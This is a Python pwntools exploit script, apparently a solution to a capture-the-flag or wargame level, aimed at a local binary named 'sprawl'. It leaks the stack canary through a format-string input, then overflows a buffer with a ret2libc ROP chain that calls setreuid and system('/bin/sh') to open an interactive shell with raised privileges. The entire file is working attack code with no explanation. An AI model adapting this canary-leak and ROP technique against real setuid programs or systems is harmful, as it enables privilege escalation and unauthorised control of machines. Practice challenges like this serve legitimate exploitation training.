import sys
from pwn import *

io = process("/home/level07/sprawl")

context.arch = 'amd64'

io.recvuntil(b"tag: ")
io.sendline(b"%23$p")
io.recvuntil(b"Routing via ")
stack_canary = io.recvline().decode().strip()[2:]
io.recvuntil(b"Header (hex): ")
print(stack_canary)

count = 0xff
block_size = 0
header_data = f"deadbeef {hex(count)[2:]} {hex(block_size)[2:]}".encode()
io.sendline(header_data)
io.recvuntil(b"bytes): ")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

SETREUID = libc.sym["setreuid"]
SYSTEM = libc.sym["system"]

BIN_SH = next(libc.search(b"/bin/sh"))

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(1024)
rop_chain += p64(ROP_RSI)
rop_chain += p64(1024)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(SETREUID)
rop_chain += p64(ROP_RDI)
rop_chain += p64(BIN_SH)
rop_chain += p64(rop.ret[0])
rop_chain += p64(SYSTEM)

payload = b"A" * 72
payload += p64(int(stack_canary, 16))
payload += b"A"*8
payload += rop_chain
payload += b'A' * (255 - len(payload))

io.send(payload)
io.interactive()